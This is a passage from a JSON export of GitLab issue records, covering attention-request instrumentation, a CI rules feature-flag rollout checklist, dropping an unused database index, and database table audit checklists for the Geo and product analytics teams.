"full":"gitlab-org/gitlab#359787"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106778208,"iid":359767,"project_id":278964,"title":"Instrumentation for attention requests in merge requests","description":"## Problem to Solve\n\nNow that https://gitlab.com/groups/gitlab-org/-/epics/5331 has been released, we should make sure we add these actions to our instrumentation so we understand their adoption and usage as teams continue to move to these features.\n\n## Proposal\n\nInstrumentation should be added for attention requests to count the unique actions per user (using redis_hll) for the following:\n\n - attention request added\n - attention request removed\n - attention added to assignee\n - attention added to reviewer\n - attention removed from assignee\n - attention removed from reviewer\n\nCount metrics should also be added for:\n\n - total number of attention requests added\n - total number of attention requests removed\n\n### Additional Details\n\nPer user metrics need to be added to the [`Code Review Aggregate Metrics`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/aggregates/code_review.yml) to ensure they're counted across the board.","state":"closed","created_at":"2022-04-18T13:57:55.446Z","updated_at":"2022-06-28T19:00:17.574Z","closed_at":"2022-06-28T19:00:17.553Z","closed_by":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"labels":["[deprecated] Accepting merge requests","backend","devops::create","feature::enhancement","group::code review","instrumentation","section::dev","type::feature"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359767","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359767","notes":"https://gitlab.com/api/v4/projects/278964/issues/359767/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359767/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359767","relative":"#359767","full":"gitlab-org/gitlab#359767"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7813,"epic":{"id":485763,"iid":7813,"title":"Attention requests enhancements","url":"/groups/gitlab-org/-/epics/7813","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106768694,"iid":359740,"project_id":278964,"title":"[Feature flag] Rollout of `ci_fix_rules_if_comparison_with_regexp_variable`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout #35438 / !85310 on production,\nthat is currently behind the `ci_fix_rules_if_comparison_with_regexp_variable` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline authoring\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-authoring`\n- Best individual to reach out to: @furkanayhan \n- PM: `@dhershkovitch`\n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWe expect nothing to change for CI configs that do not use a regexp variable on the right side of `=~` and `!~` comparisons.\n\n```yaml\ntest1:\n  script: exit 0\n  rules:\n    - if: '$teststring =~ $pattern'\n```\n\nWith this FF, we expect that the `$pattern` variable above will start to be evaluated as regexp, not string as before.\n\n### What might happen if this goes wrong?\n\nPossible problems;\n- Some jobs may not be created/included in pipelines because of wrongly evaluated \"if\" conditions.\n- `regexp = Lexeme::Pattern.build_and_evaluate(regexp, variables)` may raise an error.\n\nIf something unexpected happens, we can just remove/disable the feature flag.\n\n### What can we monitor to detect problems with this?\n\nWe can only track the errors in Sentry:\n- Lexeme errors: https://sentry.gitlab.net/gitlab/gitlabcom/?query=Lexeme\n- Pipeline creation errors: https://sentry.gitlab.net/gitlab/gitlabcom/?query=CreatePipelineWorker\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable true --dev`\n    - [x] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n      The best environment to validate the feature in is [staging-canary](https://about.gitlab.com/handbook/engineering/infrastructure/environments/#staging-canary)\n      as this is the first environment deployed to. Note you will need to make sure you are configured to use canary as outlined [here](https://about.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/)\n      when accessing the staging environment in order to make sure you are testing appropriately.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab ci_fix_rules_if_comparison_with_regexp_variable true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss ci_fix_rules_if_comparison_with_regexp_variable true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com ci_fix_rules_if_comparison_with_regexp_variable true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org ci_fix_rules_if_comparison_with_regexp_variable true`\n    - [ ] `/chatops run feature set --group=gitlab-com ci_fix_rules_if_comparison_with_regexp_variable true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e ci_fix_rules_if_comparison_with_regexp_variable true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com. \n- [ ] Ensure that any breaking changes have been announced following the [release post process](https://about.gitlab.com/handbook/marketing/blog/release-posts/#deprecations-removals-and-breaking-changes) to ensure GitLab customers are aware.\n- [x] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [x] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable \u003crollout-percentage\u003e --random`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_fix_rules_if_comparison_with_regexp_variable`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_fix_rules_if_comparison_with_regexp_variable` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete ci_fix_rules_if_comparison_with_regexp_variable --dev`\n    - [ ] `/chatops run feature delete ci_fix_rules_if_comparison_with_regexp_variable --staging`\n    - [ ] `/chatops run feature delete ci_fix_rules_if_comparison_with_regexp_variable`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set ci_fix_rules_if_comparison_with_regexp_variable false\n```","state":"closed","created_at":"2022-04-18T10:12:16.893Z","updated_at":"2022-08-15T13:42:38.951Z","closed_at":"2022-07-28T06:25:13.531Z","closed_by":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"labels":["Category:Pipeline Authoring","backend","devops::verify","feature flag","group::pipeline authoring","section::ops","type::feature","workflow::production"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"}],"author":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"type":"ISSUE","assignee":{"id":514662,"username":"furkanayhan","name":"Furkan Ayhan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/514662/avatar.png","web_url":"https://gitlab.com/furkanayhan"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359740","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":50,"completed_count":5},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"5 of 50 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359740","notes":"https://gitlab.com/api/v4/projects/278964/issues/359740/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359740/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359740","relative":"#359740","full":"gitlab-org/gitlab#359740"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":61387,"iid":75,"sequence":22,"group_id":9970,"title":null,"description":null,"state":3,"created_at":"2022-05-29T00:05:02.030Z","updated_at":"2022-08-22T00:05:02.161Z","start_date":"2022-08-08","due_date":"2022-08-21","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/61387"},"health_status":"on_track"},{"id":106712479,"iid":359381,"project_id":278964,"title":"Drop unused index ci_job_artifacts_expire_at_unlocked_idx","description":"## the Problem\n\nWe've recently built a new partial index that's entirely the same, but additionally exclude trace-type artifacts since those are not expirable, i.e. have no `expire_at` value. The indexes are both on, and ordered by, `expire_at` so this older index has a big bunch of a few hundred million job traces at one end of the index that we'll never need or touch.\n\nBy also restricting to `WHERE expire_at IS NOT NULL`, we exclude job traces and reduce the size of the index by about 86%:\n\nIndex sizes from db-lab:\n\n Schema |                  Name                           | Type  |    Owner    |      Table       |  Size   | Description \n--------|-------------------------------------------------|-------|-------------|------------------|---------|-------------\n public | ci_job_artifacts_expire_at_unlocked_idx         | index | joe_dcimino | ci_job_artifacts | 6602 MB | CREATE INDEX ci_job_artifacts_expire_at_unlocked_idx ON ci_job_artifacts USING btree (expire_at) WHERE (locked = 0); |\n public | index_ci_job_artifacts_on_expire_at_for_removal | index | joe_dcimino | ci_job_artifacts | 906 MB | CREATE INDEX index_ci_job_artifacts_on_expire_at_for_removal ON ci_job_artifacts USING btree (expire_at) WHERE ((locked = 0) AND (expire_at IS NOT NULL)); |\n\nThe [new index](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/83664) was built over the weekend of April 2-3, and as of April 4th I've verified that the new index has been built, and the planner has wisely [switched over to using it](https://thanos.gitlab.net/graph?g0.expr=sum(rate(pg_stat_user_indexes_idx_tup_read%7Benv%3D%22gprd%22%2C%20relname%3D%22ci_job_artifacts%22%7D%5B5m%5D))%20by%20(indexrelname)\u0026g0.tab=0\u0026g0.stacked=0\u0026g0.range_input=2w\u0026g0.max_source_resolution=0s\u0026g0.deduplicate=1\u0026g0.partial_response=0\u0026g0.store_matches=%5B%5D) instead of the one we're dropping:\n\n![image](/uploads/d2228aa63f6ed3d61bf792c5d9345bc2/image.png) ![image](/uploads/1929610ac202fc0bc3d6b8805e7de6a8/image.png)\n \n## The Proposal\n\nNow that the larger index is entirely unused, we should just drop it from the table.","state":"closed","created_at":"2022-04-15T22:56:06.410Z","updated_at":"2022-04-15T23:00:21.487Z","closed_at":"2022-04-15T23:00:11.999Z","closed_by":{"id":730684,"username":"drew","name":"drew stachon","state":"active","avatar_url":"https://secure.gravatar.com/avatar/59b7f2c95acd4a085d964f745ead6bdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/drew"},"labels":["Category:Build Artifacts","devops::verify","follow-up","group::pipeline execution","performance-refinement","section::ops"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":730684,"username":"drew","name":"drew stachon","state":"active","avatar_url":"https://secure.gravatar.com/avatar/59b7f2c95acd4a085d964f745ead6bdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/drew"}],"author":{"id":730684,"username":"drew","name":"drew stachon","state":"active","avatar_url":"https://secure.gravatar.com/avatar/59b7f2c95acd4a085d964f745ead6bdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/drew"},"type":"ISSUE","assignee":{"id":730684,"username":"drew","name":"drew stachon","state":"active","avatar_url":"https://secure.gravatar.com/avatar/59b7f2c95acd4a085d964f745ead6bdb?s=80\u0026d=identicon","web_url":"https://gitlab.com/drew"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359381","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359381","notes":"https://gitlab.com/api/v4/projects/278964/issues/359381/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359381/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359381","relative":"#359381","full":"gitlab-org/gitlab#359381"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106711154,"iid":359359,"project_id":278964,"title":"Database Dictionary Audit for Enablement:Geo","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [ ] upload_states\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] upload_states description has been updated\n  - [ ] upload_states `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_hashed_storage_attachments_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_hashed_storage_attachments_events description has been updated\n  - [ ] geo_hashed_storage_attachments_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] ci_job_artifact_states\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] ci_job_artifact_states description has been updated\n  - [ ] ci_job_artifact_states `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_nodes\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_nodes description has been updated\n  - [ ] geo_nodes `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_node_statuses\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_node_statuses description has been updated\n  - [ ] geo_node_statuses `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_event_log\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_event_log description has been updated\n  - [ ] geo_event_log `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_job_artifact_deleted_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_job_artifact_deleted_events description has been updated\n  - [ ] geo_job_artifact_deleted_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_events description has been updated\n  - [ ] geo_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_cache_invalidation_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_cache_invalidation_events description has been updated\n  - [ ] geo_cache_invalidation_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_repository_renamed_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_repository_renamed_events description has been updated\n  - [ ] geo_repository_renamed_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_reset_checksum_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_reset_checksum_events description has been updated\n  - [ ] geo_reset_checksum_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_container_repository_updated_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_container_repository_updated_events description has been updated\n  - [ ] geo_container_repository_updated_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_lfs_object_deleted_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_lfs_object_deleted_events description has been updated\n  - [ ] geo_lfs_object_deleted_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_repository_created_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_repository_created_events description has been updated\n  - [ ] geo_repository_created_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_hashed_storage_migrated_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_hashed_storage_migrated_events description has been updated\n  - [ ] geo_hashed_storage_migrated_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_node_namespace_links\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_node_namespace_links description has been updated\n  - [ ] geo_node_namespace_links `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_repository_deleted_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_repository_deleted_events description has been updated\n  - [ ] geo_repository_deleted_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_repository_updated_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_repository_updated_events description has been updated\n  - [ ] geo_repository_updated_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] geo_repositories_changed_events\n  - [ ] geo_replication is the correct feature category or has been updated\n  - [ ] geo_repositories_changed_events description has been updated\n  - [ ] geo_repositories_changed_events `milestone` and `introduced_by_url` seem accurate\n\n- [ ] uploads\n  - [ ] backup_restore is the correct feature category or has been updated\n  - [ ] uploads description has been updated\n  - [ ] uploads `milestone` and `introduced_by_url` seem accurate\n\n\n## Why is this effort happening?\n\nThere have been many times that issues occur in production, but the the infrastructure team doesn't have the information it needs\nto identify subject matter experts who can help resolve things quickly. This in turn can delay the time it takes\nto find and fix pressing issues.\n\n## How much time should we expect to spend on this?\n\nDepends, if the team has a lot of tables, it may take a little bit to get all of the information together.\nIf not, this could be _very_ fast. The descriptions are as much or little as the team wants to add. More\ninformation may help folks self service better.\n\n## How urgent is this?\n\nThe urgency is up to the team. If the tables have poor information or are misassigned, that may cause more\nburden on the team when answering questions.","state":"closed","created_at":"2022-04-15T21:18:04.856Z","updated_at":"2022-05-24T15:36:36.332Z","closed_at":"2022-05-24T12:14:02.244Z","closed_by":{"id":4375373,"username":"cat","name":"Catalin Irimie","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fd4f68fe3a123d56ac4413dc960b7559?s=80\u0026d=identicon","web_url":"https://gitlab.com/cat"},"labels":["Category:Database","Database tooling","devops::systems","documentation","group::geo","missed:15.0","section::enablement","type::maintenance","workflow::in review"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":4375373,"username":"cat","name":"Catalin Irimie","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fd4f68fe3a123d56ac4413dc960b7559?s=80\u0026d=identicon","web_url":"https://gitlab.com/cat"}],"author":{"id":480097,"username":"alexives","name":"Alex Ives","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480097/avatar.png","web_url":"https://gitlab.com/alexives"},"type":"ISSUE","assignee":{"id":4375373,"username":"cat","name":"Catalin Irimie","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fd4f68fe3a123d56ac4413dc960b7559?s=80\u0026d=identicon","web_url":"https://gitlab.com/cat"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359359","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":80,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 80 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359359","notes":"https://gitlab.com/api/v4/projects/278964/issues/359359/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359359/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359359","relative":"#359359","full":"gitlab-org/gitlab#359359"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7842,"epic":{"id":492559,"iid":7842,"title":"Database Feature Category Audit","url":"/groups/gitlab-org/-/epics/7842","group_id":9970,"human_readable_end_date":"May 31, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106711152,"iid":359358,"project_id":278964,"title":"Database Dictionary Audit for Growth:Product Intelligence","description":"Recently the database team has started documenting all database tables in `db/doc`. As an MVP, we've assigned\neach table to a feature category. We attempted to automate this, and then made rough guesses on the ones that\ncouldn't be automatically identified either using [this spreadsheet](https://docs.google.com/spreadsheets/d/1Rb4YgFz-2BP81v1efWxLn6TeKuf37SKvAdo91WQHqP0/edit#gid=0)\nor just by guessing based on their name and code references. In order to make sure these are accurate, I'm\nasking every team to take a look at the tables associated with their feature categories assoicated with their\nstages.\n\nWhat we need from your team? Look through the list of tables and fix any mistaken labels and update the description\nfield to help folks know what purpose the table serves.\n\n## Process (per table)\n\n1. Are the feature categories correct?\n   - Keep in mind that tables can have multiple categories. Look at [the list](https://about.gitlab.com/handbook/product/categories/#categories-a-z) and if there are any other categories it belongs to, add them.\n   - If a table has no category that seems to be a perfect match, assign it to the closest match. Tables _must_ have at least one feature category.\n   - If the table is assigned to a feature category for a different group, open a merge request changing the category and assign it to the EM for the group\n    responsible for that category.\n2. Update the description of the table to give anybody interacting with it context around the purpose and submit a merge request with the\n  information.\n3. Double check the `milestone` and `introduced_by_url` to see if they are accurate\n\n## Tables\n\n- [x] product_analytics_events_experimental\n  - [x] product_analytics is the correct feature category or has been updated\n  - [x] product_analytics_events_experimental description has been updated\n  - [x] product_analytics_events_experimental `milestone` and `introduced_by_url` seem accurate\n\n- [x] user_interacted_projects\n  - [x] product_analytics is the correct feature category or has been updated\n  - [x] user_interacted_projects description has been updated\n  - [x] user_interacted_projects `milestone` and `introduced_by_url` seem accurate\n\n- [x] users_statistics\n  - [x] product_analytics is the correct feature category or has been updated\n  - [x] users_statistics description has been updated\n  - [x] users_statistics `milestone` and `introduced_by_url` seem accurate\n\n- [x] 